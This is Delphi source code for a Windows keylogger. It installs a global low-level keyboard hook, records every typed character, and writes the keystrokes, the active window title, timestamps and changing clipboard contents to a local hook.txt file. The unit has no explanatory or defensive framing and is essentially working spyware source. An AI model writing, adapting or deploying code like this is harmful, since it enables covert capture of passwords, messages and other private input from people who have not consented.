unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics, Vcl.Clipbrd, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.Buttons, Vcl.StdCtrls, Vcl.ExtCtrls;

const
  WH_KEYBOARD_LL = 13;
  crlf = #$0D#$0A;

type
  TKBDLLHOOKSTRUCT = packed record
    FVkCode: DWORD;
    FScanCode: DWORD;
    FFlags: DWORD;
    FTime: DWORD;
    FDwExtraInfo: pointer;
  end;

  PKBDLLHOOKSTRUCT = ^TKBDLLHOOKSTRUCT;

  TForm1 = class(TForm)
    Timer1: TTimer;
    Memo1: TMemo;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  MainkeyboardHook: cardinal;
  Key, MouseKey: Boolean;
  ClipBrdBuffer: string;

implementation

{$R *.dfm}

procedure writedoc(str: string);
var
  f: TextFile;
begin
  AssignFile(f, 'hook.txt');

  if FileExists(ExtractFilePath(ParamStr(0)) + 'hook.txt') = false then
  begin
    Rewrite(f);
    Append(f);
  end
  else
    Append(f);

  Writeln(f, str);
  Close(f);
end;

function GetChar(lparam: integer): Ansistring;
var
  LvData: PKBDLLHOOKSTRUCT;
  LvKeyState: TKeyboardState;
  LvRetCode: integer;
  LvLayout: hkl;
begin
  LvData := pointer(lparam);
  GetKeyboardState(LvKeyState);
  LvLayout := GetKeyBoardLayout(GetWindowThreadProcessId(GetForegroundWindow));
  SetLength(Result, 2);
  LvRetCode := ToAsciiEx(LvData.FVkCode, LvData.FScanCode, LvKeyState, @Result[1], 0, LvLayout);
  case LvRetCode of
    0: Result := '';
    1: SetLength(Result, 1);
  else
    Result := '';
  end;
end;

function sGetLastError: string;
var
  LvMsgID: DWORD;
  LvBuffer: pchar;
begin
  LvMsgID := GetLastError;
  FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM or FORMAT_MESSAGE_ALLOCATE_BUFFER, nil, LvMsgID, 0, @LvBuffer, 0, nil);
  Result := string(LvBuffer);
  LocalFree(cardinal(LvBuffer));
end;

function KbdProc(code: integer; wparam: integer; lparam: integer): integer; stdcall;
var
  LvTempStr: string;
begin
  if (code < 0) or (code <> HC_ACTION) then
    Result := 0
  else
  begin
    if wparam = wm_keydown then
    begin
      // write to string
      if PAnsiChar(lparam) <> ' ' then
        Form1.Memo1.Text := Form1.Memo1.Text + PAnsiChar(GetChar(lparam))
      else
      begin
        LvTempStr := Form1.Memo1.Text;
        Delete(LvTempStr, length(LvTempStr), 1);
        Form1.Memo1.Text := LvTempStr;
      end;
    end;

    if wparam = wm_syskeydown then
      Application.ProcessMessages;

    Result := 0;
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  MainkeyboardHook := SetWindowsHookEx(WH_KEYBOARD_LL, @KbdProc, HInstance, 0);
  if MainkeyboardHook <> INVALID_HANDLE_VALUE then
    Memo1.Lines.Add('Hook set...' + crlf);
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  if MainkeyboardHook <> INVALID_HANDLE_VALUE then
  begin
    UnhookWindowsHookEx(MainkeyboardHook);
    Memo1.Lines.Add(crlf + 'Hook completed...');
  end;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  ss: string;
  buf: array [Byte] of Char;
begin
  if getasynckeystate(13) <> 0 then
  begin
    Key := True;
    while Key = True do
    begin
      if getasynckeystate(13) = 0 then
      begin
        Key := false;
        if Memo1.Text <> '' then
        begin
          GetWindowText(GetForegroundWindow, buf, length(buf) * SizeOf(buf[0]));
          writedoc(Memo1.Text + ' Time:' + TimeToStr(time) + ' Date:' +
            DateToStr(Date) + ' ' + buf);
        end;
        Memo1.Clear;
      end;
    end;
    // end;

    if getasynckeystate(1) <> 0 then
    begin
      MouseKey := True;
      while MouseKey = True do
      begin
        if getasynckeystate(1) = 0 then
        begin
          MouseKey := false;
          if Memo1.Text <> '' then
          begin
            GetWindowText(GetForegroundWindow, buf,
              length(buf) * SizeOf(buf[0]));
            writedoc(Memo1.Text + ' Time:' + TimeToStr(time) + ' Date:' +
              DateToStr(Date) + ' ' + buf);
          end;
          Memo1.Clear;
        end;
      end;
    end;

    try
      if ClipBrdBuffer <> Clipboard.AsText then
      begin
        ClipBrdBuffer := Clipboard.AsText;
        writedoc('Clipboard=(' + ClipBrdBuffer + ') Time:' + TimeToStr(time) +
          ' Date:' + DateToStr(Date));
      end;
    except
      Application.ProcessMessages;
    end;
  end;
end;

end.
